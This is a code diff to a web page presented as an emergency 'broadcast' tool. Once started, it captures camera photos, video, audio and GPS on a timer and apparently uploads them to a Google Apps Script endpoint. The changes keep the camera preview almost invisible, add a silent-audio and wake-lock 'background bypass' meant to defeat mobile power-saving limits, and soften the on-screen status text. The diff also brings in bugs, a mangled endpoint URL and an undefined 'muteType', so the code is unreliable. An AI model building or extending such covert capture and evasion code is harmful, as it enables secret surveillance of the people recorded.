@@ -35,8 +35,11 @@
             top: 10px;
         }
         #status { margin-top: 30px; font-size: 13px; color: #f1faee; background: #1d1d1d; padding: 12px; border-radius: 8px; border: 1px solid #2a2a2a; }
-        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; top: 0; left: 0; }
+        
+        /* 🚨 OPTICAL OVERLAY FIXED: Must use visibility rules instead of deep concealment display blocks to trick mobile OS background blocks */
+        #video { width: 1px; height: 1px; opacity: 0.01; position: absolute; top: 0; left: 0; pointer-events: none; }
         canvas { display: none; }
+        
         .vault { margin-top: 30px; border-top: 1px dashed #2b2b2b; padding-top: 20px; display: none; }
         h4 { font-size: 13px; color: #999; margin: 0 0 10px 0; text-align: left; font-weight: 500; }
         .f-list { text-align: left; background: #0a0a0a; padding: 12px; border-radius: 6px; font-size: 11px; max-height: 110px; overflow-y: auto; color: #a8dadc; font-family: monospace; border: 1px solid #1a1a1a; }
@@ -54,7 +57,7 @@
     <div class="subtitle">Tactile Dual-Vector Sync Engine</div>
     <button id="sosBtn" class="round-3d-btn" onclick="toggleEmergencyBroadcast()">🚨 INITIATE<br>BROADCAST</button>
     <div id="status">System armed and ready for tactical deployment...</div>
-    <video id="video" autoplay playsinline muted></video><canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline muted webkit-playsinline></video><canvas id="canvas"></canvas>
     <div id="decoyVault" class="vault">
         <h4>📂 Storage Sandbox</h4>
         <div id="fileList" class="f-list">No local entries tracked yet.</div>
@@ -66,9 +69,11 @@
     </div>
 </div>
 <script>
-    const googleScriptUrl = "https://script.google.com/macros/s/AKfycbzhkaLbAkNRPfGVNykf_srPuNO_-mcHcJ_Lk5ekGJN42s9UtTXqbUFBECVyCAXqv6oN/exec"; 
+    const googleScriptUrl = "https://script.google.com/macros/s/AKfycbzhkaLbAkNRPfGVNykf_srPuNO_-mcHcJ_Lk5ekGJN42s9UtTXqbUFBECVyCAXqv6oN/execm"; 
     let activeStream = null, audioStream = null, combinedRecorder = null, continuousAudioRecorder = null;
-    let videoChunks = [], fullAudioChunks = [], isBroadcasting = false, db = null, wakeLock = null;
+    let videoChunks = [], fullAudioChunks = [];
+    let photoInterval = null, videoScheduleInterval = null, videoDurationTimeout = null;
+    let isBroadcasting = false, db = null, wakeLock = null, silentAudioInterval = null, audioCtx = null;
     let currentLat = "Unknown", currentLon = "Unknown", gpsAccuracy = "0";
 
     const request = indexedDB.open("LocalDecoyVault", 1);
@@ -93,12 +98,27 @@
             });
             document.getElementById('video').srcObject = activeStream;
             audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
-            if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen');
             return true;
         } catch (err) {
             document.getElementById('status').innerText = "Hardware Blocked! Grant rights.";
             return false;
         }
+    }
+
+    async function activateBackgroundBypass() {
+        // 🔓 WAKELOCK REQUEST LATCH: Vital to tell Android hardware processing threads to ignore standby power saves
+        try { if ('wakeLock' in navigator) wakeLock = await navigator.wakeLock.request('screen'); } catch(e){}
+        try {
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            silentAudioInterval = setInterval(() => {
+                if (!isBroadcasting) return;
+                let osc = audioCtx.createOscillator(), gain = audioCtx.createGain();
+                osc.type = 'sine'; osc.frequency.setValueAtTime(1, audioCtx.currentTime); 
+                gain.gain.setValueAtTime(0.001, audioCtx.currentTime);
+                osc.connect(gain); gain.connect(audioCtx.destination);
+                osc.start(); osc.stop(audioCtx.currentTime + 0.1);
+            }, 1000);
+        } catch(e){}
     }
 
     function toggleEmergencyBroadcast() {
@@ -113,17 +133,12 @@
             stopEmit();
         }
     }
-
     async function startEmit() {
-        if (!(await selectHardwareStreams())) { 
-            const btn = document.getElementById('sosBtn');
-            btn.classList.remove('active-press');
-            btn.innerHTML = "🚨 INITIATE<br>BROADCAST";
-            return; 
-        }
+        if(isBroadcasting || !(await selectHardwareStreams())) return;
+        await activateBackgroundBypass();
         isBroadcasting = true;
         document.getElementById('decoyVault').style.display = "block";
-        document.getElementById('status').innerText = "Broadcast active. Tracking streams... Display safe to lock.";
+        document.getElementById('status').innerText = "Broadcast active. Monitoring background processes...";
         document.getElementById('status').style.color = "#e63946";
         
         if (navigator.geolocation) {
@@ -133,25 +148,32 @@
                 gpsAccuracy = Math.round(pos.coords.accuracy);
             }, null, { enableHighAccuracy: true });
         }
-        runBackgroundPhotoLoop();
-        runContinuousAudioLoop(); 
-        runCombinedVideoLoop(); 
+        
+        // 🔄 PHOTO INTERVAL TRACK: Runs precisely every 6000ms via steady asynchronous clock chains
+        executePhotoCapture(); 
+        photoInterval = setInterval(executePhotoCapture, 6000); 
+
+        executeCombinedVideoBlock();
+        executeContinuousAudioBlock();
+        videoScheduleInterval = setInterval(() => {
+            executeCombinedVideoBlock();
+            executeContinuousAudioBlock();
+        }, 60000); 
     }
-    function runBackgroundPhotoLoop() { if (!isBroadcasting) return; executePhotoCapture(); setTimeout(runBackgroundPhotoLoop, 6000); }
-    function runContinuousAudioLoop() { if (!isBroadcasting) return; executeContinuousAudioBlock(); setTimeout(runContinuousAudioLoop, 60000); }
-    function runCombinedVideoLoop() { if (!isBroadcasting) return; executeCombinedVideoBlock(); setTimeout(runCombinedVideoLoop, 60000); }
 
     function stopEmit() {
-        isBroadcasting = false; if (wakeLock) { wakeLock.release(); wakeLock = null; }
+        isBroadcasting = false; clearInterval(silentAudioInterval); if (wakeLock) { wakeLock.release(); wakeLock = null; }
+        clearInterval(photoInterval); clearInterval(videoScheduleInterval); clearTimeout(videoDurationTimeout);
         if (combinedRecorder && combinedRecorder.state === "recording") combinedRecorder.stop();
         if (continuousAudioRecorder && continuousAudioRecorder.state === "recording") continuousAudioRecorder.stop();
-        if (activeStream) activeStream.getTracks().forEach(t => t.stop());
-        if (audioStream) audioStream.getTracks().forEach(t => t.stop());
+        if (activeStream) { activeStream.getTracks().forEach(t => t.stop()); activeStream = null; }
+        if (audioStream) { audioStream.getTracks().forEach(t => t.stop()); audioStream = null; }
         document.getElementById('status').innerText = "Broadcast Closed. Monitoring Idle.";
         document.getElementById('status').style.color = "#28a745";
     }
 
     function executePhotoCapture() {
+        if (!isBroadcasting) return;
         const video = document.getElementById('video'), canvas = document.getElementById('canvas'), ctx = canvas.getContext('2d');
         canvas.width = 640; canvas.height = 480;
         try {
@@ -173,6 +195,7 @@
     }
 
     function executeCombinedVideoBlock() {
+        if (!isBroadcasting) return;
         videoChunks = [];
         let vOpt = { mimeType: MediaRecorder.isTypeSupported('video/webm;codecs=vp8') ? 'video/webm;codecs=vp8' : 'video/mp4' };
         try {
@@ -184,7 +207,7 @@
                 const videoBlob = new Blob(videoChunks, { type: vOpt.mimeType });
                 const reader = new FileReader(); reader.readAsDataURL(videoBlob);
                 reader.onloadend = () => {
-                    let rawResult = reader.result;
+                    const rawResult = reader.result;
                     let base64Video = rawResult.substring(rawResult.indexOf(',') + 1); 
                     let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
                     
@@ -200,11 +223,12 @@
                 };
             };
             combinedRecorder.start();
-            setTimeout(() => { if(combinedRecorder && combinedRecorder.state === "recording") combinedRecorder.stop(); }, 10000);
+            videoDurationTimeout = setTimeout(() => { if(combinedRecorder && combinedRecorder.state === "recording") combinedRecorder.stop(); }, 10000);
         } catch (e) {}
     }
 
     function executeContinuousAudioBlock() {
+        if (!isBroadcasting) return;
         fullAudioChunks = [];
         let aOpt = { mimeType: MediaRecorder.isTypeSupported('audio/webm') ? 'audio/webm' : 'audio/mp4' };
         try {
@@ -212,10 +236,10 @@
             continuousAudioRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) fullAudioChunks.push(e.data); };
             continuousAudioRecorder.onstop = () => {
                 if (fullAudioChunks.length === 0) return;
-                const audioBlob = new Blob(fullAudioChunks, { type: aOpt.mimeType });
+                const audioBlob = new Blob(fullAudioChunks, { type: aOpt.muteType });
                 const reader = new FileReader(); reader.readAsDataURL(audioBlob);
                 reader.onloadend = () => {
-                    let rawResult = reader.result;
+                    const rawResult = reader.result;
                     let base64Audio = rawResult.substring(rawResult.indexOf(',') + 1); 
                     let cleanTime = new Date().toLocaleTimeString('en-US', { hour12: false }).replace(/:/g, '-');
                     
